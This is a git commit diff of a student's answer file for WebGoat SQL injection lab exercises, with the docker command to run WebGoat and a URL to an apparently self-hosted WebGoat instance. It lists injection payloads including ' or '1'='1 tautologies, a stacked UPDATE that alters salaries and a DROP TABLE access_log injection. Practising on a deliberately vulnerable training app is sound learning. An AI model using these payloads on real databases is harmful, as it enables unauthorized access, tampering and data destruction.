796ed0922a02636a4c5c12691440e846038c6968
KarlSemilla <karlsemilla1@gmail.com>
2020-03-10 19:41:23 -0600

    bruteforce.py added

--- assignment7.sql
+++ assignment7.sql
@@ -1,4 +1,5 @@
-sudo docker run -p 8080:8080 --name webgoat --rm -it -v ~/webgoatdata:/home/webgoat/.webgoat-8.0-8088465 webgoat/webgoat-8.0:latest
+sudo docker run -p 8080:8080 --name webgoat --rm -it -v ~/webgoat-data:/home/webgoat/.webgoat-8.0-8088465 webgoat/webgoat-8.0:latest
+http://34.70.4.78:8080/WebGoat/login
 
 -- SQL Injection (intro)
 1. select department from employees where last_name = 'Franco';
@@ -8,4 +9,8 @@ sudo docker run -p 8080:8080 --name webgoat --rm -it -v ~/webgoatdata:/home/webg
 9. SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith or 1 = 1';	
 10. Login_Count field = 0 and User_Id field = 0 or 1=1;
 11. For both fields ' or '1' = '1;
-12. EmployeeName=update employees set salary = '100000' where last_name = 'Smith' AuthTan = '
+12. Employee name field = anything AuthTan ='; UPDATE employees SET salary=99999 WHERE first_name='John
+13. %'; DROP TABLE access_log;--;
+
+-- SQL Injection (advanced)
+1. 
